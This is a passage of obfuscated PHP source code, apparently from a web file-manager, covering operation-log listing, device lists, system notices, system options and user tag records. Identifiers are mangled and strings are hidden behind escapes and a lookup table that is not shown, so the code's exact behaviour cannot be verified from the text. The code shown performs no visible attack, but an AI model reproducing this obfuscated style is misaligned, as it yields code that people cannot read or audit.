$¾¹õ¢³É = $ôĞ¥Ù¢Ÿ[$¾¹õ¢³É]; $œ¡£şˆ = $œ¡£şˆ . "{$ãËŞÍéé}\x20{$¾¹õ¢³É}"; return $this->order($œ¡£şˆ); } public function get($‡ÕÃ™ëÒ = '') { $“”üÃ¨— =& $_SERVER[ˆö¿ÚÌ¼]; if (!$‡ÕÃ™ëÒ) { show_json(array()); } $è™û§ü¹ = array(); if ($‡ÕÃ™ëÒ[$“”üÃ¨—[1785]]) { $è™û§ü¹[$“”üÃ¨—[1785]] = $‡ÕÃ™ëÒ[$“”üÃ¨—[1785]]; } if (isset($‡ÕÃ™ëÒ[$“”üÃ¨—[845]])) { $˜ô¿—à£ = $‡ÕÃ™ëÒ[$“”üÃ¨—[845]]; $’”¨ÃœÍ = isset($‡ÕÃ™ëÒ[$“”üÃ¨—[846]]) ? $‡ÕÃ™ëÒ[$“”üÃ¨—[846]] : time(); $è™û§ü¹[$“”üÃ¨—[234]] = array($“”üÃ¨—[411], array($˜ô¿—à£, $’”¨ÃœÍ)); } if ($‡ÕÃ™ëÒ[$“”üÃ¨—[33]]) { $šúĞƒÒş = explode($“”üÃ¨—[50], $‡ÕÃ™ëÒ[$“”üÃ¨—[33]]); $¶ à©ÄÙ = $this->typeFile(); $‹¹Ç ¾Ù = array(); foreach ($šúĞƒÒş as $úÄ»‚¸²) { $‹¹Ç ¾Ù[] = $úÄ»‚¸²; if (isset($¶ à©ÄÙ[$úÄ»‚¸²])) { $‹¹Ç ¾Ù = array_merge($‹¹Ç ¾Ù, $¶ à©ÄÙ[$úÄ»‚¸²]); } } $‹¹Ç ¾Ù = array_unique($‹¹Ç ¾Ù); if ($‹¹Ç ¾Ù) { $è™û§ü¹[$“”üÃ¨—[33]] = array($“”üÃ¨—[7], $‹¹Ç ¾Ù); } } else { $è™û§ü¹[$“”üÃ¨—[33]] = array($“”üÃ¨—[2456], $“”üÃ¨—[2457]); } if (!empty($‡ÕÃ™ëÒ[$“”üÃ¨—[2455]])) { $è™û§ü¹[$“”üÃ¨—[538]] = array($“”üÃ¨—[462], "\x25{$‡ÕÃ™ëÒ[$“”üÃ¨—[2455]]}\45"); } $Â³Ùâ½ = $this->_makeOrder()->where($è™û§ü¹)->selectPage(); if (empty($Â³Ùâ½[$“”üÃ¨—[448]])) { show_json(array(), !0, $Â³Ùâ½[$“”üÃ¨—[445]]); } $Â³Ùâ½[$“”üÃ¨—[448]] = $this->logList($Â³Ùâ½[$“”üÃ¨—[448]]); return $Â³Ùâ½; } private function ipAddress(&$·Ô½ìõî) { $—ì‘›íı =& $_SERVER[ˆö¿ÚÌ¼]; if (!empty($·Ô½ìõî[$—ì‘›íı[2455]])) { $’œÁÂ§‡ = IpLocation::get($·Ô½ìõî[$—ì‘›íı[2455]]); } else { $’œÁÂ§‡ = LNG($—ì‘›íı[2458]); } $·Ô½ìõî[$—ì‘›íı[2459]] = $’œÁÂ§‡; } private function descZipDownload($ãä—‰’, &$‚²ç¸¡Ö) { $÷âÀ†œá =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($ãä—‰’[$÷âÀ†œá[2460]])) { return; } $éåà‰ŞÕ = json_decode($ãä—‰’[$÷âÀ†œá[2460]], !0); foreach ($éåà‰ŞÕ as $œŠ£çÈè) { try { $øÃ‘ô = IO::infoFullSimple($œŠ£çÈè[$÷âÀ†œá[87]]); } catch (Exception $…Å½İÁ) { continue; } $ãä—‰’[$÷âÀ†œá[87]] = $œŠ£çÈè[$÷âÀ†œá[87]]; $‚²ç¸¡Ö[] = $ãä—‰’[$÷âÀ†œá[194]] = $øÃ‘ô[$÷âÀ†œá[194]]; $‚²ç¸¡Ö[] = $ãä—‰’[$÷âÀ†œá[2223]] = $øÃ‘ô[$÷âÀ†œá[193]]; break; } return $ãä—‰’; } private function getSourceList(&$¿¤Óàïç) { $°¬ÔÎÄ³ =& $_SERVER[ˆö¿ÚÌ¼]; $Õ—ä½´å = array(); foreach ($¿¤Óàïç as $º¸ô–Ö => $“ •ş) { $áµÁ Á« = json_decode($“ •ş[$°¬ÔÎÄ³[538]], !0); if ($“ •ş[$°¬ÔÎÄ³[33]] == $°¬ÔÎÄ³[1959]) { $áµÁ Á« = $this->descZipDownload($áµÁ Á«, $Õ—ä½´å); $¿¤Óàïç[$º¸ô–Ö][$°¬ÔÎÄ³[538]] = json_encode($áµÁ Á«); continue; } if (strpos($“ •ş[$°¬ÔÎÄ³[33]], $°¬ÔÎÄ³[2225]) !== 0) { if (!isset($áµÁ Á«[$°¬ÔÎÄ³[87]]) || strpos($“ •ş[$°¬ÔÎÄ³[33]], $°¬ÔÎÄ³[2461]) !== 0) { continue; } try { $«Î“ÎÇ = IO::infoFullSimple($áµÁ Á«[$°¬ÔÎÄ³[87]]); } catch (Exception $…âŸĞù) { continue; } $Õ—ä½´å[] = $áµÁ Á«[$°¬ÔÎÄ³[194]] = $«Î“ÎÇ[$°¬ÔÎÄ³[194]]; $Õ—ä½´å[] = $áµÁ Á«[$°¬ÔÎÄ³[2223]] = $«Î“ÎÇ[$°¬ÔÎÄ³[193]]; $¿¤Óàïç[$º¸ô–Ö][$°¬ÔÎÄ³[538]] = json_encode($áµÁ Á«); continue; } $Õ—ä½´å[] = $áµÁ Á«[$°¬ÔÎÄ³[194]]; $Õ—ä½´å[] = $áµÁ Á«[$°¬ÔÎÄ³[2223]]; if ($áµÁ Á«[$°¬ÔÎÄ³[33]] == $°¬ÔÎÄ³[637]) { $Õ—ä½´å[] = $áµÁ Á«[$°¬ÔÎÄ³[538]][$°¬ÔÎÄ³[1255]]; $Õ—ä½´å[] = $áµÁ Á«[$°¬ÔÎÄ³[538]][$°¬ÔÎÄ³[1256]]; } if ($áµÁ Á«[$°¬ÔÎÄ³[33]] == $°¬ÔÎÄ³[2234]) { $Õ—ä½´å[] = $áµÁ Á«[$°¬ÔÎÄ³[538]][$°¬ÔÎÄ³[194]]; } } if (!$Õ—ä½´å) { return array(); } return Model($°¬ÔÎÄ³[915])->sourceListInfo($Õ—ä½´å, !0); } private function logList($Ş³ÌÈ×ä) { $Ç®Ôà•£ =& $_SERVER[ˆö¿ÚÌ¼]; $³ÊŒ¢§° = array_to_keyvalue($Ş³ÌÈ×ä, $Ç®Ôà•£[12], $Ç®Ôà•£[1785]); $ÖØÏó½ = Model($Ç®Ôà•£[611])->userListInfo(array_unique($³ÊŒ¢§°)); $Ñ™åÊ¾‚ = $this->getSourceList($Ş³ÌÈ×ä); $¨ŸÃŞ–Š = $this->typeAll(); $Ğ•ÔĞ²ò = array(); $ß¦¹¥ı“ = array(); foreach ($Ş³ÌÈ×ä as $Øó±‡ş => $Ê¡ïüÇØ) { $ÒïÆ‡Éö = $Ê¡ïüÇØ[$Ç®Ôà•£[33]]; $à”áœëË = isset($ÖØÏó½[$Ê¡ïüÇØ[$Ç®Ôà•£[1785]]]) ? $ÖØÏó½[$Ê¡ïüÇØ[$Ç®Ôà•£[1785]]] : !1; $Õø±ôª¥ = strpos($ÒïÆ‡Éö, $Ç®Ôà•£[2462]) === 0 ? LNG($Ç®Ôà•£[2463]) : LNG($Ç®Ôà•£[2458]); $Ê¡ïüÇØ[$Ç®Ôà•£[32]] = isset($à”áœëË[$Ç®Ôà•£[32]]) ? $à”áœëË[$Ç®Ôà•£[32]] : LNG($Ç®Ôà•£[2458]); $Ê¡ïüÇØ[$Ç®Ôà•£[2285]] = isset($à”áœëË[$Ç®Ôà•£[2285]]) ? $à”áœëË[$Ç®Ôà•£[2285]] : $Ç®Ôà•£[12]; $Ê¡ïüÇØ[$Ç®Ôà•£[1673]] = isset($¨ŸÃŞ–Š[$ÒïÆ‡Éö]) ? $¨ŸÃŞ–Š[$ÒïÆ‡Éö] : $Õø±ôª¥; $Ê¡ïüÇØ[$Ç®Ôà•£[2166]] = $à”áœëË; $ïĞÂèÀ = json_decode($Ê¡ïüÇØ[$Ç®Ôà•£[538]], !0); $Ê¡ïüÇØ[$Ç®Ôà•£[2455]] = isset($ïĞÂèÀ[$Ç®Ôà•£[2455]]) ? $ïĞÂèÀ[$Ç®Ôà•£[2455]] : $Ç®Ôà•£[12]; $Ê¡ïüÇØ[$Ç®Ôà•£[2459]] = IpLocation::get($Ê¡ïüÇØ[$Ç®Ôà•£[2455]]); if (strpos($ÒïÆ‡Éö, $Ç®Ôà•£[2225]) === 0 || isset($ïĞÂèÀ[$Ç®Ôà•£[2223]])) { $ïĞÂèÀ[$Ç®Ôà•£[90]] = $Ñ™åÊ¾‚[$ïĞÂèÀ[$Ç®Ôà•£[194]]]; $ïĞÂèÀ[$Ç®Ôà•£[2239]] = $Ñ™åÊ¾‚[$ïĞÂèÀ[$Ç®Ôà•£[2223]]]; if ($ïĞÂèÀ[$Ç®Ôà•£[33]] == $Ç®Ôà•£[637]) { $ïĞÂèÀ[$Ç®Ôà•£[538]][$Ç®Ôà•£[1255]] = $Ñ™åÊ¾‚[$ïĞÂèÀ[$Ç®Ôà•£[538]][$Ç®Ôà•£[1255]]]; $ïĞÂèÀ[$Ç®Ôà•£[538]][$Ç®Ôà•£[1256]] = $Ñ™åÊ¾‚[$ïĞÂèÀ[$Ç®Ôà•£[538]][$Ç®Ôà•£[1256]]]; } if ($ïĞÂèÀ[$Ç®Ôà•£[33]] == $Ç®Ôà•£[2234]) { $ïĞÂèÀ[$Ç®Ôà•£[538]][$Ç®Ôà•£[194]] = $Ñ™åÊ¾‚[$ïĞÂèÀ[$Ç®Ôà•£[538]][$Ç®Ôà•£[194]]]; } if ($ïĞÂèÀ[$Ç®Ôà•£[33]] == $Ç®Ôà•£[1954]) { $ïĞÂèÀ[$Ç®Ôà•£[2239]] = $ïĞÂèÀ[$Ç®Ôà•£[90]]; $ïĞÂèÀ[$Ç®Ôà•£[2223]] = $ïĞÂèÀ[$Ç®Ôà•£[2239]][$Ç®Ôà•£[194]]; $ïĞÂèÀ[$Ç®Ôà•£[90]] = !1; $ïĞÂèÀ[$Ç®Ôà•£[194]] = $Ç®Ôà•£[12]; } $°•±‘ì = array($Ç®Ôà•£[1954], $Ç®Ôà•£[2221]); if (!in_array($ïĞÂèÀ[$Ç®Ôà•£[33]], $°•±‘ì)) { if ($ïĞÂèÀ[$Ç®Ôà•£[90]] && $ïĞÂèÀ[$Ç®Ôà•£[90]][$Ç®Ôà•£[191]] == $Ç®Ôà•£[192]) { $ß¦¹¥ı“[] = $Ê¡ïüÇØ[$Ç®Ôà•£[478]]; unset($Ş³ÌÈ×ä[$Øó±‡ş]); continue; } if ($ïĞÂèÀ[$Ç®Ôà•£[2239]] && $ïĞÂèÀ[$Ç®Ôà•£[2239]][$Ç®Ôà•£[191]] == $Ç®Ôà•£[192]) { $ß¦¹¥ı“[] = $Ê¡ïüÇØ[$Ç®Ôà•£[478]]; unset($Ş³ÌÈ×ä[$Øó±‡ş]); continue; } } } $Ê¡ïüÇØ[$Ç®Ôà•£[538]] = $ïĞÂèÀ; unset($Ê¡ïüÇØ[$Ç®Ôà•£[2464]]); $Ğ•ÔĞ²ò[] = $Ê¡ïüÇØ; } $this->clearSystemPathLog($ß¦¹¥ı“); return $Ğ•ÔĞ²ò; } private function clearSystemPathLog($°íùå¤Æ) { $Ëî¤šÆ” =& $_SERVER[ˆö¿ÚÌ¼]; if (count($°íùå¤Æ) == 0) { return; } $¥Î¹å‘â = array($Ëî¤šÆ”[478] => array($Ëî¤šÆ”[7], array_unique($°íùå¤Æ))); $this->where($¥Î¹å‘â)->delete(); } public function deviceList($…Õù²«®, $êå¶ó×– = 0) { $ğÜÂÆÜ› =& $_SERVER[ˆö¿ÚÌ¼]; $ëúì´êß = array($ğÜÂÆÜ›[1785] => $…Õù²«®, $ğÜÂÆÜ›[234] => array($ğÜÂÆÜ›[1105], $êå¶ó×–), $ğÜÂÆÜ›[33] => $ğÜÂÆÜ›[1928]); $…òŞŒëõ = array(); $€ªç­ó = $this->field($ğÜÂÆÜ›[2465])->where($ëúì´êß)->order($ğÜÂÆÜ›[2237])->limit(50)->select(); foreach ($€ªç­ó as $ÛÊŠ‘Ÿà => $ìÜÓÚ®) { if ($ÛÊŠ‘Ÿà > 0 && abs($ìÜÓÚ®[$ğÜÂÆÜ›[234]] - $€ªç­ó[$ÛÊŠ‘Ÿà - 1][$ğÜÂÆÜ›[234]]) < 5) { continue; } $Îì¤‰‚ = json_decode($ìÜÓÚ®[$ğÜÂÆÜ›[538]], !0); $ìÜÓÚ®[$ğÜÂÆÜ›[2455]] = isset($Îì¤‰‚[$ğÜÂÆÜ›[2455]]) ? $Îì¤‰‚[$ğÜÂÆÜ›[2455]] : $ğÜÂÆÜ›[12]; unset($Îì¤‰‚[$ğÜÂÆÜ›[2455]]); $²Øò´Ş = $this->deviceType($Îì¤‰‚[$ğÜÂÆÜ›[2226]]); if (isset($…òŞŒëõ[$²Øò´Ş])) { continue; } $ìÜÓÚ®[$ğÜÂÆÜ›[2459]] = IpLocation::get($ìÜÓÚ®[$ğÜÂÆÜ›[2455]]); $ìÜÓÚ®[$ğÜÂÆÜ›[538]] = $Îì¤‰‚; $…òŞŒëõ[$²Øò´Ş] = $ìÜÓÚ®; } return array_values($…òŞŒëõ); } public function deviceType($«Ş‘Œ…ö) { return $«Ş‘Œ…ö; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\x6e\157\x74\151\x63\145\114\151\163\164"; public $field = array("\156\141\155\x65", "\143\x6f\x6e\164\x65\156\164", "\141\165\x74\150", "\x6d\x6f\x64\x65", "\x74\151\x6d\x65", "\164\x79\x70\x65", "\154\145\166\x65\154", "\145\156\141\142\154\145", "\163\x6f\162\x74"); public function listData($–º¤…Ø— = false, $•£û€õ = "\163\x6f\162\x74", $¢¶Öß§à = false) { return parent::listData($–º¤…Ø—, $•£û€õ, $¢¶Öß§à); } public function add($Âù¾•İò) { $àûĞâçÊ =& $_SERVER[ˆö¿ÚÌ¼]; $÷å÷Ø‰ = time(); if ($Âù¾•İò[$àûĞâçÊ[16]] == $àûĞâçÊ[2466]) { $÷å÷Ø‰ = strtotime($Âù¾•İò[$àûĞâçÊ[207]]); } $Âù¾•İò[$àûĞâçÊ[207]] = $÷å÷Ø‰; return parent::insert($Âù¾•İò); } public function update($åë¬“»ô, $†é¸²“) { $ûç÷©œ¼ =& $_SERVER[ˆö¿ÚÌ¼]; $È¥›¦œ = $this->listData($åë¬“»ô); if (!$È¥›¦œ) { return !1; } $¸‡¾ÇãÙ = time(); if ($†é¸²“[$ûç÷©œ¼[16]] == $ûç÷©œ¼[2466]) { $¸‡¾ÇãÙ = strtotime($†é¸²“[$ûç÷©œ¼[207]]); } $†é¸²“[$ûç÷©œ¼[207]] = $¸‡¾ÇãÙ; return parent::update($åë¬“»ô, $†é¸²“); } public function remove($æ‰¡ëü) { $¦û¶’ş© = $this->listData($æ‰¡ëü); if (!$¦û¶’ş© || $¦û¶’ş©[$_SERVER[ˆö¿ÚÌ¼][192]]) { return !1; } return parent::remove($æ‰¡ëü); } public function sort($££‚€¼«, $àÔ˜Ş‰µ) { return parent::update($££‚€¼«, $àÔ˜Ş‰µ); } public function enable($ºüê Æ­, $óĞÚÈ¸’) { return parent::update($ºüê Æ­, array($_SERVER[ˆö¿ÚÌ¼][2467] => $óĞÚÈ¸’)); } private function initUserOption() { $Ù¦ıĞñ¸ =& $_SERVER[ˆö¿ÚÌ¼]; $this->optionType = $Ù¦ıĞñ¸[2468]; $this->modelType = $Ù¦ıĞñ¸[2469]; $this->field = array($Ù¦ıĞñ¸[2470], $Ù¦ıĞñ¸[32], $Ù¦ıĞñ¸[207], $Ù¦ıĞñ¸[33], $Ù¦ıĞñ¸[2471], $Ù¦ıĞñ¸[835], $Ù¦ıĞñ¸[229]); } public function userNoticeGet($Ê¾¾ŞßŒ = false) { $this->initUserOption(); return parent::listData($Ê¾¾ŞßŒ, $_SERVER[ˆö¿ÚÌ¼][478], !0); } public function userNoticeAdd($ˆ©Ïªæš) { $±ïØâÜÄ =& $_SERVER[ˆö¿ÚÌ¼]; $this->initUserOption(); $ò°ıÎ©å = $this->findByKey($±ïØâÜÄ[2470], $ˆ©Ïªæš[$±ïØâÜÄ[478]]); if ($ò°ıÎ©å) { return !0; } $ó™Å§™· = array($±ïØâÜÄ[2470] => $ˆ©Ïªæš[$±ïØâÜÄ[478]], $±ïØâÜÄ[32] => $ˆ©Ïªæš[$±ïØâÜÄ[32]], $±ïØâÜÄ[207] => $ˆ©Ïªæš[$±ïØâÜÄ[207]], $±ïØâÜÄ[33] => isset($ˆ©Ïªæš[$±ïØâÜÄ[33]]) ? $ˆ©Ïªæš[$±ïØâÜÄ[33]] : 1, $±ïØâÜÄ[2471] => isset($ˆ©Ïªæš[$±ïØâÜÄ[2471]]) ? $ˆ©Ïªæš[$±ïØâÜÄ[2471]] : 0, $±ïØâÜÄ[835] => 0, $±ïØâÜÄ[229] => 0); return parent::insert($ó™Å§™·); } public function userNoticeEdit($œÔÆÏˆ, $ûöù‚¢Ì) { $this->initUserOption(); return parent::update($œÔÆÏˆ, $ûöù‚¢Ì); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\145\x6d\x5f\157\x70\x74\151\x6f\x6e"; protected $jsonField = array("\155\145\156\165", "\x72\x6f\154\x65", "\162\157\154\145\x47\162\x6f\x75\160", "\x72\x65\x67\151\163\x74", "\145\x6d\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ÅÅ¢¼ç¤) { return "\123\x79\x73\164\145\x6d\x4f\160\x74\151\x6f\x6e\x5f{$ÅÅ¢¼ç¤}"; } protected function optionDefault($—Ş’œÄÏ = '') { $­ñ„Ì³© =& $_SERVER[ˆö¿ÚÌ¼]; if ($—Ş’œÄÏ == $­ñ„Ì³©[12]) { return $GLOBALS[$­ñ„Ì³©[6]][$­ñ„Ì³©[460]]; } } } goto EñÍ­ãŠ; E¡ùÎ÷öºå: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($¡»©ûŒˆ) { $€ûâÍä =& $_SERVER[ˆö¿ÚÌ¼]; return array($€ûâÍä[2101] => array($€ûâÍä[2534] . USER_ID, $€ûâÍä[2102])); } protected function listData() { $åâ§µõ“ =& $_SERVER[ˆö¿ÚÌ¼]; $¸áç–‚Ç = array($åâ§µõ“[1776] => USER_ID, $åâ§µõ“[571] => array($åâ§µõ“[2105], 0)); $Èë“ç = $åâ§µõ“[2535]; $ç¼Ê¿ = $this->field($Èë“ç)->where($¸áç–‚Ç)->order($åâ§µõ“[2108])->select(); return $ç¼Ê¿ ? $ç¼Ê¿ : array(); } protected function addToTag($·¸¡”“‰, $÷áç­À) { $á×ÙÉ· =& $_SERVER[ˆö¿ÚÌ¼]; if (!Model($á×ÙÉ·[2258])->listData($÷áç­À)) { return !1; } if (is_numeric($·¸¡”“‰)) { $Î®À¢ÕÕ = Model($á×ÙÉ·[915])->pathInfo($·¸¡”“‰); if (!$Î®À¢ÕÕ) { return !1; } } else { $Î®À¢ÕÕ = IO::infoSimple($·¸¡”“‰); if (!$Î®À¢ÕÕ) { return !1; } $–¯åÊÖì = $Î®À¢ÕÕ[$á×ÙÉ·[32]]; $Ì¼˜–ÁÅ = $Î®À¢ÕÕ[$á×ÙÉ·[33]]; if (isset($Î®À¢ÕÕ[$á×ÙÉ·[497]])) { $Ì¼˜–ÁÅ = $Î®À¢ÕÕ[$á×ÙÉ·[497]] == $á×ÙÉ·[91] ? $á×ÙÉ·[78] : $á×ÙÉ·[233]; } } $ıÓÔ¹ÔÖ = array($á×ÙÉ·[1776] => USER_ID, $á×ÙÉ·[571] => $÷áç­À, $á×ÙÉ·[507] => $·¸¡”“‰, $á×ÙÉ·[508] => $Ì¼˜–ÁÅ ? $Ì¼˜–ÁÅ : $á×ÙÉ·[502], $á×ÙÉ·[506] => $–¯åÊÖì ? $–¯åÊÖì : $á×ÙÉ·[12], $á×ÙÉ·[1990] => 0); if ($this->where($ıÓÔ¹ÔÖ)->find()) { return !1; } return $this->add($ıÓÔ¹ÔÖ); } protected function removeFromTag($‰õè¦, $è»äÌŸ) { $¯ù×´“Ñ =& $_SERVER[ˆö¿ÚÌ¼]; if (!Model($¯ù×´“Ñ[2258])->listData($è»äÌŸ)) { return !1; } if (is_array($‰õè¦)) { $‰õè¦ = array($¯ù×´“Ñ[7], $‰õè¦); } $ÍœãªÃ = array($¯ù×´“Ñ[1776] => USER_ID, $¯ù×´“Ñ[571] => $è»äÌŸ, $¯ù×´“Ñ[507] => $‰õè¦); return $this->where($ÍœãªÃ)->delete(); } protected function removeByTag($¿¤ Á·–) { $ãáÜ‰ù  =& $_SERVER[ˆö¿ÚÌ¼]; if (!$¿¤ Á·–) { return !1; } $®´—ì£ = array($ãáÜ‰ù [1776] => USER_ID, $ãáÜ‰ù [571] => $¿¤ Á·–); return $this->where($®´—ì£)->delete(); } protected function removeBySource($Œ†…Ú) { $Ø©¾í =& $_SERVER[ˆö¿ÚÌ¼]; if (is_array($Œ†…Ú)) { $Œ†…Ú = array($Ø©¾í[7], $Œ†…Ú); } $ šÕÌÄ¾ = array($Ø©¾í[1776] => USER_ID, $Ø©¾í[571] => array($Ø©¾í[1105], 0), $Ø©¾í[507] => $Œ†…Ú); return $this->where($ šÕÌÄ¾)->delete(); } }